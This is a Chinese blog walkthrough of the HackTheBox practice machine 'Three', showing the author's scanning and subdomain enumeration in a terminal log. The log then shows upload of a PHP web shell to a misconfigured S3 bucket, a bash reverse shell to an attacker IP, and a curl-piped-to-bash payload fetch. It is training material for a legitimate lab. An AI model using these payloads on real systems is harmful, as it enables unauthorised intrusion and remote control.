<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>HTB之Three | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",favicon:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",avatar:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">HTB之Three</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv5</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-08-17 23:28:19</span> <span class="mobile">2023-08-17 23:28</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-10-08 22:46:07</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/hackthebox/">HTB</a>&nbsp;</li><li>| <a href="/tags/success/">通关</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><blockquote><p>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></blockquote><h1 id="TASK-1"><a href="#TASK-1" class="headerlink" title="TASK 1"></a>TASK 1</h1><ul><li>问：打开了多少个 TCP 端口？</li><li>答：2</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/159f8d9c214a799397d7cb46234d4067-173613.png" alt="image-20230301160539245"></p><h1 id="TASK-2"><a href="#TASK-2" class="headerlink" title="TASK 2"></a>TASK 2</h1><ul><li>问：网站“联系”部分提供的电子邮件地址的域名是什么?</li><li>答：thetoppers.htb</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/33710e707475a3e015b90d0ce6f2032b-173613.png" alt="image-20230301160912661"></p><h1 id="TASK-3"><a href="#TASK-3" class="headerlink" title="TASK 3"></a>TASK 3</h1><ul><li>问：在没有DNS服务器的情况下，我们可以使用哪个Linux文件将主机名解析为IP地址，以便能够访问指向这些主机名的网站?</li><li>答：<code>/etc/hosts</code></li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/d50da8d863ae55c7e949b9336b2113c8-173613.png" alt="image-20230301161005588"></p><h1 id="TASK-4"><a href="#TASK-4" class="headerlink" title="TASK 4"></a>TASK 4</h1><ul><li>问：在进一步枚举期间发现哪个子域?</li><li>答：s3.thetoppers.htb</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/a76817797e2c89f6ad78307b48a8cb09-173613.png" alt="image-20230301170306446"></p><h1 id="TASK-5"><a href="#TASK-5" class="headerlink" title="TASK 5"></a>TASK 5</h1><ul><li>问：发现的子域上正在运行哪个服务?</li><li>答：Amazon S3</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/a0705358d2b50e00bd21ef18e833a430-173613.png" alt="image-20230302101540930"></p><h1 id="TASK-6"><a href="#TASK-6" class="headerlink" title="TASK 6"></a>TASK 6</h1><ul><li>问：哪个命令行实用程序可用于与发现的子域上运行的服务交互？</li><li>答：<code>awscli</code></li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/da82620904a4d4a4b9a9340c8c068ed2-173613.png" alt="image-20230302111520520"></p><h1 id="TASK-7"><a href="#TASK-7" class="headerlink" title="TASK 7"></a>TASK 7</h1><ul><li>问：哪个命令用于设置AWS CLI配置？</li><li>答：<code>aws configure</code></li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/3ee260d7a6ab50ee3115afb18f6f3ac0-173613.png" alt="image-20230302112434427"></p><h1 id="TASK-8"><a href="#TASK-8" class="headerlink" title="TASK 8"></a>TASK 8</h1><ul><li>问：上面的实用程序使用什么命令来列出所有S3存储桶？</li><li>答：aws s3 ls</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/b3fa5ea93bc20e4181cc1ba903fc2283-173613.png" alt="image-20230302113456803"></p><h1 id="TASK-9"><a href="#TASK-9" class="headerlink" title="TASK 9"></a>TASK 9</h1><ul><li>问：此服务器配置为运行以哪种Web脚本语言编写的文件？</li><li>答：php</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/16d1b7f5e1478bd1fe51fc1d16509228-173613.png" alt="image-20230302142224540"></p><h1 id="SUBMIT-FLAG"><a href="#SUBMIT-FLAG" class="headerlink" title="SUBMIT FLAG"></a>SUBMIT FLAG</h1><ul><li>问：Submit root flag</li><li>答：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># P.S.nmap 扫描</span></span><br><span class="line">kali@kali:~/Test$ nmap -p- --min-rate 5000 -sV -Pn 10.129.243.196</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 15:39 CST</span><br><span class="line">Warning: 10.129.243.196 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.243.196</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 63913 filtered tcp ports (no-response), 1620 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">22/tcp open  tcpwrapped</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 208.10 seconds</span><br><span class="line"><span class="comment"># P.S.nmap 扫描</span></span><br><span class="line">kali@kali:~/Test$ nmap -p22,80 -sV -sT -Pn 10.129.243.196</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 16:50 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> thetoppers.htb (10.129.243.196)</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 34.25 seconds</span><br><span class="line"><span class="comment"># P.S.whatweb 扫描</span></span><br><span class="line">kali@kali:~/Test$ whatweb -v 10.129.243.196</span><br><span class="line">……</span><br><span class="line">	String       : mail@thetoppers.htb</span><br><span class="line">……</span><br><span class="line"><span class="comment"># P.S.修改 hosts 文件</span></span><br><span class="line">kali@kali:~/Test$ <span class="built_in">echo</span> <span class="string">&quot;10.129.243.196 thetoppers.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.129.243.196 thetoppers.htb</span><br><span class="line"><span class="comment"># P.S.通过爆破子域名可知使用的 Amazon 的 s3 服务</span></span><br><span class="line">kali@kali:~/Test$ gobuster vhost --append-domain -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://thetoppers.htb</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.5</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://thetoppers.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.5</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   <span class="literal">true</span></span><br><span class="line">===============================================================</span><br><span class="line">2023/03/01 16:37:07 Starting gobuster <span class="keyword">in</span> VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: s3.thetoppers.htb Status: 404 [Size: 21]</span><br><span class="line">[ERROR] 2023/03/01 16:38:16 [!] could not <span class="built_in">read</span> body context deadline exceeded (Client.Timeout or context cancellation <span class="keyword">while</span> reading body)</span><br><span class="line">Progress: 612 / 5001 (12.24%)[ERROR] 2023/03/01 16:39:44 [!] could not <span class="built_in">read</span> body context deadline exceeded (Client.Timeout or context cancellation <span class="keyword">while</span> reading body)</span><br><span class="line">Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]</span><br><span class="line">……</span><br><span class="line"><span class="comment"># P.S.使用 wfuzz 爆破</span></span><br><span class="line">kali@kali:~/Test$ wfuzz -c -u http://10.129.13.182 -H <span class="string">&quot;Host: FUZZ.thetoppers.htb&quot;</span> -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --hw 26</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.129.13.182/</span></span><br><span class="line"><span class="string">Total requests: 5000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000014:   200        234 L    1036 W     11947 Ch    &quot;autoconfig&quot;                                     ……                                                                                 </span></span><br><span class="line"><span class="string">000000247:   502        11 L     47 W       424 Ch      &quot;s3&quot;</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string"># P.S.修改 housts 文件，为 s3.thetoppers.htb 指定 ip</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ echo &quot;10.129.13.182 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts</span></span><br><span class="line"><span class="string">10.129.13.182 s3.thetoppers.htb</span></span><br><span class="line"><span class="string"># P.S.满足官方提示：期望在访问 s3.thetoppers.htb 时看到 &#123;“status”：“running”&#125;</span></span><br><span class="line"><span class="string"># P.S.根据子域名爆破结果，也就 s3.thetoppers.htb 状态码为 404</span></span><br><span class="line"><span class="string"># P.S.根据请求包内容查询获得 AWS 相关信息，继而获得 Amazon S3</span></span><br><span class="line"><span class="string"># P.S.curl -i 打印出服务器回应的 HTTP 标头，同时输出网页的源码</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ curl -i s3.thetoppers.htb</span></span><br><span class="line"><span class="string">HTTP/1.1 404 </span></span><br><span class="line"><span class="string">Date: Thu, 02 Mar 2023 02:38:41 GMT</span></span><br><span class="line"><span class="string">Server: hypercorn-h11</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=utf-8</span></span><br><span class="line"><span class="string">Content-Length: 21</span></span><br><span class="line"><span class="string">Access-Control-Allow-Origin: *</span></span><br><span class="line"><span class="string">Access-Control-Allow-Methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH</span></span><br><span class="line"><span class="string">Access-Control-Allow-Headers: authorization,cache-control,content-length,content-md5,content-type,etag,location,x-amz-acl,x-amz-content-sha256,x-amz-date,x-amz-request-id,x-amz-security-token,x-amz-tagging,x-amz-target,x-amz-user-agent,x-amz-version-id,x-amzn-requestid,x-localstack-target,amz-sdk-invocation-id,amz-sdk-request</span></span><br><span class="line"><span class="string">Access-Control-Expose-Headers: etag,x-amz-version-id</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;status&quot;: &quot;running&quot;&#125;</span></span><br><span class="line"><span class="string"># P.S.安装 awscli 命令行工具</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ sudo apt-get install awscli</span></span><br><span class="line"><span class="string">[sudo] kali 的密码：</span></span><br><span class="line"><span class="string">正在读取软件包列表... 完成</span></span><br><span class="line"><span class="string">正在分析软件包的依赖关系树... 完成</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string"># P.S.aws configure 配置虚假信息，可为任意内容，但不能为 None</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws configure</span></span><br><span class="line"><span class="string">AWS Access Key ID [None]: test</span></span><br><span class="line"><span class="string">AWS Secret Access Key [None]: test</span></span><br><span class="line"><span class="string">Default region name [None]: tets</span></span><br><span class="line"><span class="string">Default output format [None]: test</span></span><br><span class="line"><span class="string"># P.S.--endpoint 指定要将请求发送到的 URL</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws s3 ls help</span></span><br><span class="line"><span class="string"># P.S.列出服务器托管的所有 S3 存储桶</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws s3 ls --endpoint=http://s3.thetoppers.htb</span></span><br><span class="line"><span class="string">2023-03-02 10:30:20 thetoppers.htb</span></span><br><span class="line"><span class="string"># P.S.列出指定桶下的对象和公共前缀。</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws s3 ls --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb</span></span><br><span class="line"><span class="string">                           PRE images/</span></span><br><span class="line"><span class="string">2023-03-02 10:30:20          0 .htaccess</span></span><br><span class="line"><span class="string">2023-03-02 10:30:20      11952 index.php</span></span><br><span class="line"><span class="string"># P.S.</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ echo &#x27;</span>&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&quot;abc&quot;</span>]); ?&gt;<span class="string">&#x27; &gt; test.php</span></span><br><span class="line"><span class="string"># P.S.利用 awscli 能够将文件复制到远程存储桶的功能</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws s3 --endpoint=http://s3.thetoppers.htb cp test.php s3://thetoppers.htb</span></span><br><span class="line"><span class="string">upload: ./test.php to s3://thetoppers.htb/test.php</span></span><br><span class="line"><span class="string"># P.S.检查，成功复制到 S3 存储桶</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ aws s3 ls --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb</span></span><br><span class="line"><span class="string">                           PRE images/</span></span><br><span class="line"><span class="string">2023-03-02 15:14:35          0 .htaccess</span></span><br><span class="line"><span class="string">2023-03-02 15:14:35      11952 index.php</span></span><br><span class="line"><span class="string">2023-03-02 15:55:46         31 test.php</span></span><br><span class="line"><span class="string"># P.S.利用 webshell 显示用户的ID以及所属群组的ID</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ curl http://thetoppers.htb/test.php?abc=id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string"># P.S.%20编码成功使用空格</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ curl http://thetoppers.htb/test.php?abc=ls%20../</span></span><br><span class="line"><span class="string">flag.txt</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string"># P.S.父目录直接存在 flag</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ curl http://thetoppers.htb/test.php?abc=cat%20../flag.txt</span></span><br><span class="line"><span class="string">a980d99281a28d638ac68b9bf9453c2b</span></span><br><span class="line"><span class="string"># P.S.写反弹 shell</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ vim test.sh</span></span><br><span class="line"><span class="string"># P.S.查看确认</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ cat test.sh</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">bash -i &gt;&amp; /dev/tcp/10.10.16.39/1377 0&gt;&amp;1</span></span><br><span class="line"><span class="string"># P.S.在本机 8000 端口开启小型 web 服务器来托管存储反弹 shell 命令的 bash 文件</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ python3 -m http.server 8000</span></span><br><span class="line"><span class="string">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string"># P.S.监听本地 1377 端口，用以接收反弹 shell</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ nc -lnvp 1377</span></span><br><span class="line"><span class="string">listening on [any] 1377 ...</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string"># P.S.利用 webshell 请求本地 web 服务器上托管的 test.sh 文件，实现靶机连接我方主机</span></span><br><span class="line"><span class="string">kali@kali:~/Test$ curl &#x27;</span>http://thetoppers.htb/test.php?abc=curl%2010.10.16.39:8000/test.sh|bash<span class="string">&#x27;</span></span><br><span class="line"><span class="string"># P.S.此处为成功获得反弹 shell 后执行的命令</span></span><br><span class="line"><span class="string">www-data@three:/var/www/html$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">www-data@three:/var/www/html$ ls ../</span></span><br><span class="line"><span class="string">ls ../</span></span><br><span class="line"><span class="string">flag.txt</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">www-data@three:/var/www/html$ cat ../flag.txt</span></span><br><span class="line"><span class="string">cat ../flag.txt</span></span><br><span class="line"><span class="string">a980d99281a28d638ac68b9bf9453c2b</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/cea4ffbab6c2dfc8dae7d069bb2eb977-173613.png" alt="image-20230302164012158"></p><ul><li>P.S.1.修改 hosts 文件，使靶机 ip 指向 thetoppers.htb 和 s3.thetoppers.htb，同时需要 s3.thetoppers.htb 返回 <code>&#123;“status”：“running”&#125;</code>。</li><li>根据请求 s3.thetoppers.htb 的请求包，理解扫描出的子域名 s3 的含义，找到 Amazon S3，需要联想到可能能够匿名登录。</li><li>找到 awscli 命令行工具配置并尝试匿名连接，成功后则尝试其他功能，如 copy 本地文件到 s3 存储桶中，写 webshell，构造成反弹 shell。</li></ul></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">HTB之Three</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2023-08-17 23:28:19</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/c0b181ea.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/hackthebox/">#HTB</a>&nbsp;</li><li class="tag-item"><a href="/tags/success/">#通关</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/article/c8476f93.html"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">QQ 客户端远程代码执行漏洞</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/article/3d1f808e.html"><span class="title flex-center"><span class="post-nav-title-item">HTB之Sequel</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-1"><span class="nav-number">1.</span> <span class="nav-text">TASK 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-2"><span class="nav-number">2.</span> <span class="nav-text">TASK 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-3"><span class="nav-number">3.</span> <span class="nav-text">TASK 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-4"><span class="nav-number">4.</span> <span class="nav-text">TASK 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-5"><span class="nav-number">5.</span> <span class="nav-text">TASK 5</span></a></li><li class="nav-item nav-level-1"><a 